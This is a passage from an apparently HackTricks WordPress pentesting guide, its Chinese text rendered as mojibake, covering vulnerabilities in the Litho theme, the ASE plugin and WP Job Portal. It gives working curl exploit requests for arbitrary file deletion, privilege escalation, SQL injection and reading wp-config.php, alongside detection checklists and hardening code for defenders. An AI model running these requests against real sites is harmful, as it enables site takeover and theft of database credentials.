'methods' => WP_REST_Server::READABLE,
'callback' => array($this, 'getData'),
'permission_callback' => '__return_true'
)
);
```
`permission_callback` æ˜¯ä¸€ä¸ªå›è°ƒå‡½æ•°ï¼Œç”¨äºæ£€æŸ¥ç»™å®šç”¨æˆ·æ˜¯å¦æœ‰æƒè°ƒç”¨ API æ–¹æ³•ã€‚

**å¦‚æœä½¿ç”¨å†…ç½®çš„ `__return_true` å‡½æ•°ï¼Œå®ƒå°†ç®€å•åœ°è·³è¿‡ç”¨æˆ·æƒé™æ£€æŸ¥ã€‚**

- **ç›´æ¥è®¿é—® php æ–‡ä»¶**

å½“ç„¶ï¼ŒWordPress ä½¿ç”¨ PHPï¼Œæ’ä»¶ä¸­çš„æ–‡ä»¶å¯ä»¥ç›´æ¥ä»ç½‘ç»œè®¿é—®ã€‚å› æ­¤ï¼Œå¦‚æœä¸€ä¸ªæ’ä»¶æš´éœ²äº†ä»»ä½•é€šè¿‡è®¿é—®æ–‡ä»¶è§¦å‘çš„è„†å¼±åŠŸèƒ½ï¼Œä»»ä½•ç”¨æˆ·éƒ½å¯ä»¥åˆ©ç”¨å®ƒã€‚

### é€šè¿‡ wp_ajax_nopriv è¿›è¡Œæœªè®¤è¯çš„ä»»æ„æ–‡ä»¶åˆ é™¤ (Litho ä¸»é¢˜ <= 3.0)

WordPress ä¸»é¢˜å’Œæ’ä»¶ç»å¸¸é€šè¿‡ `wp_ajax_` å’Œ `wp_ajax_nopriv_` é’©å­æš´éœ² AJAX å¤„ç†ç¨‹åºã€‚å½“ä½¿ç”¨ **_nopriv_** å˜ä½“æ—¶ï¼Œ**å›è°ƒå¯ä»¥è¢«æœªè®¤è¯çš„è®¿å®¢è®¿é—®**ï¼Œå› æ­¤ä»»ä½•æ•æ„Ÿæ“ä½œå¿…é¡»é¢å¤–å®ç°ï¼š

1. **èƒ½åŠ›æ£€æŸ¥**ï¼ˆä¾‹å¦‚ `current_user_can()` æˆ–è‡³å°‘ `is_user_logged_in()`ï¼‰ï¼Œä»¥åŠ
2. ä½¿ç”¨ `check_ajax_referer()` / `wp_verify_nonce()` éªŒè¯çš„ **CSRF nonce**ï¼Œä»¥åŠ
3. **ä¸¥æ ¼çš„è¾“å…¥æ¸…ç†/éªŒè¯**ã€‚

Litho å¤šç”¨é€”ä¸»é¢˜ï¼ˆ< 3.1ï¼‰åœ¨ *ç§»é™¤å­—ä½“ç³»åˆ—* åŠŸèƒ½ä¸­å¿˜è®°äº†è¿™ 3 ä¸ªæ§åˆ¶ï¼Œæœ€ç»ˆå‘å¸ƒäº†ä»¥ä¸‹ä»£ç ï¼ˆç®€åŒ–ç‰ˆï¼‰ï¼š
```php
function litho_remove_font_family_action_data() {
if ( empty( $_POST['fontfamily'] ) ) {
return;
}
$fontfamily = str_replace( ' ', '-', $_POST['fontfamily'] );
$upload_dir = wp_upload_dir();
$srcdir  = untrailingslashit( wp_normalize_path( $upload_dir['basedir'] ) ) . '/litho-fonts/' . $fontfamily;
$filesystem = Litho_filesystem::init_filesystem();

if ( file_exists( $srcdir ) ) {
$filesystem->delete( $srcdir, FS_CHMOD_DIR );
}
die();
}
add_action( 'wp_ajax_litho_remove_font_family_action_data',        'litho_remove_font_family_action_data' );
add_action( 'wp_ajax_nopriv_litho_remove_font_family_action_data', 'litho_remove_font_family_action_data' );
```
æ­¤ä»£ç ç‰‡æ®µå¼•å…¥çš„é—®é¢˜ï¼š

* **æœªè®¤è¯è®¿é—®** â€“ æ³¨å†Œäº† `wp_ajax_nopriv_` é’©å­ã€‚
* **æ²¡æœ‰ nonce / æƒé™æ£€æŸ¥** â€“ ä»»ä½•è®¿å®¢éƒ½å¯ä»¥è®¿é—®è¯¥ç«¯ç‚¹ã€‚
* **æ²¡æœ‰è·¯å¾„æ¸…ç†** â€“ ç”¨æˆ·æ§åˆ¶çš„ `fontfamily` å­—ç¬¦ä¸²åœ¨æ²¡æœ‰è¿‡æ»¤çš„æƒ…å†µä¸‹è¿æ¥åˆ°æ–‡ä»¶ç³»ç»Ÿè·¯å¾„ï¼Œå…è®¸ç»å…¸çš„ `../../` éå†ã€‚

#### åˆ©ç”¨

æ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€ä¸€ä¸ª HTTP POST è¯·æ±‚åˆ é™¤ **ä¸Šä¼ åŸºç¡€ç›®å½•**ï¼ˆé€šå¸¸æ˜¯ `<wp-root>/wp-content/uploads/`ï¼‰ä¸‹çš„ä»»ä½•æ–‡ä»¶æˆ–ç›®å½•ï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-ajax.php \
-d 'action=litho_remove_font_family_action_data' \
-d 'fontfamily=../../../../wp-config.php'
```
å› ä¸º `wp-config.php` ä½äº *uploads* ä¹‹å¤–ï¼Œé»˜è®¤å®‰è£…åªéœ€å››ä¸ª `../` åºåˆ—ã€‚ åˆ é™¤ `wp-config.php` ä¼šåœ¨ä¸‹æ¬¡è®¿é—®æ—¶å¼ºåˆ¶ WordPress è¿›å…¥ *å®‰è£…å‘å¯¼*ï¼Œä»è€Œå®ç°å®Œå…¨æ§åˆ¶ç½‘ç«™ï¼ˆæ”»å‡»è€…åªéœ€æä¾›æ–°çš„æ•°æ®åº“é…ç½®å¹¶åˆ›å»ºä¸€ä¸ªç®¡ç†å‘˜ç”¨æˆ·ï¼‰ã€‚

å…¶ä»–é‡è¦ç›®æ ‡åŒ…æ‹¬æ’ä»¶/ä¸»é¢˜çš„ `.php` æ–‡ä»¶ï¼ˆä»¥ç ´åå®‰å…¨æ’ä»¶ï¼‰æˆ– `.htaccess` è§„åˆ™ã€‚

#### æ£€æµ‹æ¸…å•

* ä»»ä½• `add_action( 'wp_ajax_nopriv_...')` å›è°ƒè°ƒç”¨æ–‡ä»¶ç³»ç»ŸåŠ©æ‰‹ï¼ˆ`copy()`ã€`unlink()`ã€`$wp_filesystem->delete()` ç­‰ï¼‰ã€‚
* å°†æœªç»è¿‡æ»¤çš„ç”¨æˆ·è¾“å…¥è¿æ¥åˆ°è·¯å¾„ä¸­ï¼ˆæŸ¥æ‰¾ `$_POST`ã€`$_GET`ã€`$_REQUEST`ï¼‰ã€‚
* ç¼ºå°‘ `check_ajax_referer()` å’Œ `current_user_can()`/`is_user_logged_in()`ã€‚

#### åŠ å›º
```php
function secure_remove_font_family() {
if ( ! is_user_logged_in() ) {
wp_send_json_error( 'forbidden', 403 );
}
check_ajax_referer( 'litho_fonts_nonce' );

$fontfamily = sanitize_file_name( wp_unslash( $_POST['fontfamily'] ?? '' ) );
$srcdir = trailingslashit( wp_upload_dir()['basedir'] ) . 'litho-fonts/' . $fontfamily;

if ( ! str_starts_with( realpath( $srcdir ), realpath( wp_upload_dir()['basedir'] ) ) ) {
wp_send_json_error( 'invalid path', 400 );
}
// â€¦ proceed â€¦
}
add_action( 'wp_ajax_litho_remove_font_family_action_data', 'secure_remove_font_family' );
//  ğŸ”’  NO wp_ajax_nopriv_ registration
```
> [!TIP]
> **å§‹ç»ˆ**å°†ä»»ä½•ç£ç›˜ä¸Šçš„å†™å…¥/åˆ é™¤æ“ä½œè§†ä¸ºç‰¹æƒæ“ä½œï¼Œå¹¶è¿›è¡ŒåŒé‡æ£€æŸ¥ï¼š
> â€¢ èº«ä»½éªŒè¯  â€¢ æˆæƒ  â€¢ éšæœºæ•°  â€¢ è¾“å…¥æ¸…ç†  â€¢ è·¯å¾„é™åˆ¶ï¼ˆä¾‹å¦‚é€šè¿‡ `realpath()` åŠ ä¸Š `str_starts_with()`ï¼‰ã€‚

---

### é€šè¿‡è¿‡æ—¶è§’è‰²æ¢å¤å’Œç¼ºå¤±æˆæƒè¿›è¡Œç‰¹æƒå‡çº§ï¼ˆASE "ä»¥è§’è‰²æŸ¥çœ‹ç®¡ç†å‘˜"ï¼‰

è®¸å¤šæ’ä»¶é€šè¿‡å°†åŸå§‹è§’è‰²ä¿å­˜åœ¨ç”¨æˆ·å…ƒæ•°æ®ä¸­æ¥å®ç°â€œä»¥è§’è‰²æŸ¥çœ‹â€æˆ–ä¸´æ—¶è§’è‰²åˆ‡æ¢åŠŸèƒ½ï¼Œä»¥ä¾¿ç¨åæ¢å¤ã€‚å¦‚æœæ¢å¤è·¯å¾„ä»…ä¾èµ–äºè¯·æ±‚å‚æ•°ï¼ˆä¾‹å¦‚ `$_REQUEST['reset-for']`ï¼‰å’Œæ’ä»¶ç»´æŠ¤çš„åˆ—è¡¨ï¼Œè€Œä¸æ£€æŸ¥èƒ½åŠ›å’Œæœ‰æ•ˆçš„éšæœºæ•°ï¼Œè¿™å°†å¯¼è‡´å‚ç›´ç‰¹æƒå‡çº§ã€‚

åœ¨ Admin and Site Enhancements (ASE) æ’ä»¶ï¼ˆâ‰¤ 7.6.2.1ï¼‰ä¸­å‘ç°äº†ä¸€ä¸ªçœŸå®çš„ä¾‹å­ã€‚é‡ç½®åˆ†æ”¯åŸºäº `reset-for=<username>` æ¢å¤è§’è‰²ï¼Œå¦‚æœç”¨æˆ·åå‡ºç°åœ¨å†…éƒ¨æ•°ç»„ `$options['viewing_admin_as_role_are']` ä¸­ï¼Œä½†åœ¨ç§»é™¤å½“å‰è§’è‰²å’Œé‡æ–°æ·»åŠ ç”¨æˆ·å…ƒæ•°æ® `_asenha_view_admin_as_original_roles` ä¸­ä¿å­˜çš„è§’è‰²ä¹‹å‰ï¼Œæ—¢æ²¡æœ‰æ‰§è¡Œ `current_user_can()` æ£€æŸ¥ï¼Œä¹Ÿæ²¡æœ‰è¿›è¡Œéšæœºæ•°éªŒè¯ï¼š
```php
// Simplified vulnerable pattern
if ( isset( $_REQUEST['reset-for'] ) ) {
$reset_for_username = sanitize_text_field( $_REQUEST['reset-for'] );
$usernames = get_option( ASENHA_SLUG_U, [] )['viewing_admin_as_role_are'] ?? [];

if ( in_array( $reset_for_username, $usernames, true ) ) {
$u = get_user_by( 'login', $reset_for_username );
foreach ( $u->roles as $role ) { $u->remove_role( $role ); }
$orig = (array) get_user_meta( $u->ID, '_asenha_view_admin_as_original_roles', true );
foreach ( $orig as $r ) { $u->add_role( $r ); }
}
}
```
ä¸ºä»€ä¹ˆå®ƒæ˜¯å¯åˆ©ç”¨çš„

- ä¿¡ä»» `$_REQUEST['reset-for']` å’Œæ²¡æœ‰æœåŠ¡å™¨ç«¯æˆæƒçš„æ’ä»¶é€‰é¡¹ã€‚
- å¦‚æœç”¨æˆ·ä¹‹å‰åœ¨ `_asenha_view_admin_as_original_roles` ä¸­ä¿å­˜äº†æ›´é«˜çš„æƒé™å¹¶è¢«é™çº§ï¼Œä»–ä»¬å¯ä»¥é€šè¿‡è®¿é—®é‡ç½®è·¯å¾„æ¥æ¢å¤è¿™äº›æƒé™ã€‚
- åœ¨æŸäº›éƒ¨ç½²ä¸­ï¼Œä»»ä½•ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ·éƒ½å¯ä»¥ä¸ºä»ç„¶å­˜åœ¨äº `viewing_admin_as_role_are` ä¸­çš„å¦ä¸€ä¸ªç”¨æˆ·åè§¦å‘é‡ç½®ï¼ˆæˆæƒç ´åï¼‰ã€‚

æ”»å‡»å‰æ

- å¯ç”¨è¯¥åŠŸèƒ½çš„æ˜“å—æ”»å‡»æ’ä»¶ç‰ˆæœ¬ã€‚
- ç›®æ ‡è´¦æˆ·åœ¨ç”¨æˆ·å…ƒæ•°æ®ä¸­å­˜å‚¨æœ‰è¿‡æ—¶çš„é«˜æƒé™è§’è‰²ã€‚
- ä»»ä½•ç»è¿‡èº«ä»½éªŒè¯çš„ä¼šè¯ï¼›é‡ç½®æµç¨‹ä¸­ç¼ºå°‘ nonce/èƒ½åŠ›ã€‚

åˆ©ç”¨ï¼ˆç¤ºä¾‹ï¼‰
```bash
# While logged in as the downgraded user (or any auth user able to trigger the code path),
# hit any route that executes the role-switcher logic and include the reset parameter.
# The plugin uses $_REQUEST, so GET or POST works. The exact route depends on the plugin hooks.
curl -s -k -b 'wordpress_logged_in=...' \
'https://victim.example/wp-admin/?reset-for=<your_username>'
```
åœ¨æ˜“å—æ”»å‡»çš„æ„å»ºä¸­ï¼Œè¿™ä¼šç§»é™¤å½“å‰è§’è‰²å¹¶é‡æ–°æ·»åŠ ä¿å­˜çš„åŸå§‹è§’è‰²ï¼ˆä¾‹å¦‚ï¼Œ`administrator`ï¼‰ï¼Œæœ‰æ•ˆåœ°æå‡æƒé™ã€‚

æ£€æµ‹æ¸…å•

- æŸ¥æ‰¾åœ¨ç”¨æˆ·å…ƒæ•°æ®ä¸­æŒä¹…åŒ–â€œåŸå§‹è§’è‰²â€çš„è§’è‰²åˆ‡æ¢åŠŸèƒ½ï¼ˆä¾‹å¦‚ï¼Œ`_asenha_view_admin_as_original_roles`ï¼‰ã€‚
- ç¡®å®šé‡ç½®/æ¢å¤è·¯å¾„ï¼š
  - ä» `$_REQUEST` / `$_GET` / `$_POST` è¯»å–ç”¨æˆ·åã€‚
  - é€šè¿‡ `add_role()` / `remove_role()` ä¿®æ”¹è§’è‰²ï¼Œè€Œä¸ä½¿ç”¨ `current_user_can()` å’Œ `wp_verify_nonce()` / `check_admin_referer()`ã€‚
  - åŸºäºæ’ä»¶é€‰é¡¹æ•°ç»„ï¼ˆä¾‹å¦‚ï¼Œ`viewing_admin_as_role_are`ï¼‰è¿›è¡Œæˆæƒï¼Œè€Œä¸æ˜¯åŸºäºè¡Œä¸ºè€…çš„èƒ½åŠ›ã€‚

åŠ å›º

- åœ¨æ¯ä¸ªçŠ¶æ€æ›´æ”¹åˆ†æ”¯ä¸Šå¼ºåˆ¶æ‰§è¡Œèƒ½åŠ›æ£€æŸ¥ï¼ˆä¾‹å¦‚ï¼Œ`current_user_can('manage_options')` æˆ–æ›´ä¸¥æ ¼ï¼‰ã€‚
- å¯¹æ‰€æœ‰è§’è‰²/æƒé™å˜æ›´è¦æ±‚ä½¿ç”¨ nonce å¹¶è¿›è¡ŒéªŒè¯ï¼š`check_admin_referer()` / `wp_verify_nonce()`ã€‚
- æ°¸è¿œä¸è¦ä¿¡ä»»è¯·æ±‚æä¾›çš„ç”¨æˆ·åï¼›æ ¹æ®ç»è¿‡èº«ä»½éªŒè¯çš„è¡Œä¸ºè€…å’Œæ˜ç¡®çš„ç­–ç•¥åœ¨æœåŠ¡å™¨ç«¯è§£æç›®æ ‡ç”¨æˆ·ã€‚
- åœ¨ä¸ªäººèµ„æ–™/è§’è‰²æ›´æ–°æ—¶ä½¿â€œåŸå§‹è§’è‰²â€çŠ¶æ€æ— æ•ˆï¼Œä»¥é¿å…è¿‡æ—¶çš„é«˜æƒé™æ¢å¤ï¼š
```php
add_action( 'profile_update', function( $user_id ) {
delete_user_meta( $user_id, '_asenha_view_admin_as_original_roles' );
}, 10, 1 );
```
- è€ƒè™‘å­˜å‚¨æœ€å°çŠ¶æ€å¹¶ä½¿ç”¨æ—¶é—´é™åˆ¶çš„ã€èƒ½åŠ›ä¿æŠ¤çš„ä»¤ç‰Œè¿›è¡Œä¸´æ—¶è§’è‰²åˆ‡æ¢ã€‚

---

## WordPress ä¿æŠ¤

### å®šæœŸæ›´æ–°

ç¡®ä¿ WordPressã€æ’ä»¶å’Œä¸»é¢˜æ˜¯æœ€æ–°çš„ã€‚è¿˜è¦ç¡®è®¤åœ¨ wp-config.php ä¸­å¯ç”¨äº†è‡ªåŠ¨æ›´æ–°ï¼š
```bash
define( 'WP_AUTO_UPDATE_CORE', true );
add_filter( 'auto_update_plugin', '__return_true' );
add_filter( 'auto_update_theme', '__return_true' );
```
ä¹Ÿè¦**åªå®‰è£…å¯ä¿¡çš„ WordPress æ’ä»¶å’Œä¸»é¢˜**ã€‚

### å®‰å…¨æ’ä»¶

- [**Wordfence Security**](https://wordpress.org/plugins/wordfence/)
- [**Sucuri Security**](https://wordpress.org/plugins/sucuri-scanner/)
- [**iThemes Security**](https://wordpress.org/plugins/better-wp-security/)

### **å…¶ä»–å»ºè®®**

- åˆ é™¤é»˜è®¤çš„ **admin** ç”¨æˆ·
- ä½¿ç”¨ **å¼ºå¯†ç ** å’Œ **2FA**
- å®šæœŸ **å®¡æŸ¥** ç”¨æˆ· **æƒé™**
- **é™åˆ¶ç™»å½•å°è¯•** ä»¥é˜²æ­¢æš´åŠ›æ”»å‡»
- é‡å‘½å **`wp-admin.php`** æ–‡ä»¶ï¼Œå¹¶ä»…å…è®¸å†…éƒ¨æˆ–ç‰¹å®š IP åœ°å€è®¿é—®ã€‚

### é€šè¿‡éªŒè¯ä¸è¶³çš„æœªè®¤è¯ SQL æ³¨å…¥ (WP Job Portal <= 2.3.2)

WP Job Portal æ‹›è˜æ’ä»¶æš´éœ²äº†ä¸€ä¸ª **savecategory** ä»»åŠ¡ï¼Œæœ€ç»ˆåœ¨ `modules/category/model.php::validateFormData()` å†…æ‰§è¡Œä»¥ä¸‹æ˜“å—æ”»å‡»çš„ä»£ç ï¼š
```php
$category  = WPJOBPORTALrequest::getVar('parentid');
$inquery   = ' ';
if ($category) {
$inquery .= " WHERE parentid = $category ";   // <-- direct concat âœ—
}
$query  = "SELECT max(ordering)+1 AS maxordering FROM "
. wpjobportal::$_db->prefix . "wj_portal_categories " . $inquery; // executed later
```
å¼•å…¥æ­¤ä»£ç ç‰‡æ®µçš„é—®é¢˜ï¼š

1. **æœªæ¸…ç†çš„ç”¨æˆ·è¾“å…¥** â€“ `parentid` ç›´æ¥æ¥è‡ª HTTP è¯·æ±‚ã€‚
2. **WHERE å­å¥ä¸­çš„å­—ç¬¦ä¸²è¿æ¥** â€“ æ²¡æœ‰ `is_numeric()` / `esc_sql()` / é¢„å¤„ç†è¯­å¥ã€‚
3. **æœªè®¤è¯çš„å¯è¾¾æ€§** â€“ å°½ç®¡è¯¥æ“ä½œæ˜¯é€šè¿‡ `admin-post.php` æ‰§è¡Œçš„ï¼Œä½†å”¯ä¸€çš„æ£€æŸ¥æ˜¯ **CSRF nonce** (`wp_verify_nonce()`)ï¼Œä»»ä½•è®¿é—®è€…éƒ½å¯ä»¥ä»åµŒå…¥çŸ­ä»£ç  `[wpjobportal_my_resumes]` çš„å…¬å…±é¡µé¢ä¸­è·å–ã€‚

#### åˆ©ç”¨

1. è·å–ä¸€ä¸ªæ–°çš„ nonceï¼š
```bash
curl -s https://victim.com/my-resumes/ | grep -oE 'name="_wpnonce" value="[a-f0-9]+' | cut -d'"' -f4
```
2. é€šè¿‡æ»¥ç”¨ `parentid` æ³¨å…¥ä»»æ„ SQLï¼š
```bash
curl -X POST https://victim.com/wp-admin/admin-post.php \
-d 'task=savecategory' \
-d '_wpnonce=<nonce>' \
-d 'parentid=0 OR 1=1-- -' \
-d 'cat_title=pwn' -d 'id='
```
å“åº”æŠ«éœ²äº†æ³¨å…¥æŸ¥è¯¢çš„ç»“æœæˆ–æ›´æ”¹äº†æ•°æ®åº“ï¼Œè¯æ˜äº† SQLiã€‚

### æœªè®¤è¯çš„ä»»æ„æ–‡ä»¶ä¸‹è½½ / è·¯å¾„éå† (WP Job Portal <= 2.3.2)

å¦ä¸€ä¸ªä»»åŠ¡ï¼Œ**downloadcustomfile**ï¼Œå…è®¸è®¿é—®è€…é€šè¿‡è·¯å¾„éå†ä¸‹è½½ **ç£ç›˜ä¸Šçš„ä»»ä½•æ–‡ä»¶**ã€‚ å—å½±å“çš„ä»£ç ä½äº `modules/customfield/model.php::downloadCustomUploadedFile()`ï¼š
```php
$file = $path . '/' . $file_name;
...
echo $wp_filesystem->get_contents($file); // raw file output
```
`$file_name` æ˜¯æ”»å‡»è€…æ§åˆ¶çš„ï¼Œå¹¶ä¸”**æœªç»è¿‡æ¸…ç†**åœ°è¿æ¥ã€‚å†æ¬¡å¼ºè°ƒï¼Œå”¯ä¸€çš„é—¨æ§›æ˜¯å¯ä»¥ä»ç®€å†é¡µé¢è·å–çš„**CSRF nonce**ã€‚

#### åˆ©ç”¨
```bash
curl -G https://victim.com/wp-admin/admin-post.php \
--data-urlencode 'task=downloadcustomfile' \
--data-urlencode '_wpnonce=<nonce>' \
--data-urlencode 'upload_for=resume' \
--data-urlencode 'entity_id=1' \
--data-urlencode 'file_name=../../../wp-config.php'
```
æœåŠ¡å™¨å“åº” `wp-config.php` çš„å†…å®¹ï¼Œæ³„éœ²äº†æ•°æ®åº“å‡­æ®å’Œè®¤è¯å¯†é’¥ã€‚

## å‚è€ƒæ–‡çŒ®

- [Unauthenticated Arbitrary File Deletion Vulnerability in Litho Theme](https://patchstack.com/articles/unauthenticated-arbitrary-file-delete-vulnerability-in-litho-the/)
- [Multiple Critical Vulnerabilities Patched in WP Job Portal Plugin](https://patchstack.com/articles/multiple-critical-vulnerabilities-patched-in-wp-job-portal-plugin/)
- [Rare Case of Privilege Escalation in ASE Plugin Affecting 100k+ Sites](https://patchstack.com/articles/rare-case-of-privilege-escalation-in-ase-plugin-affecting-100k-sites/)
- [ASE 7.6.3 changeset â€“ delete original roles on profile update](https://plugins.trac.wordpress.org/changeset/3211945/admin-site-enhancements/tags/7.6.3/classes/class-view-admin-as-role.php?old=3208295&old_path=admin-site-enhancements%2Ftags%2F7.6.2%2Fclasses%2Fclass-view-admin-as-role.php)

{{#include ../../banners/hacktricks-training.md}}
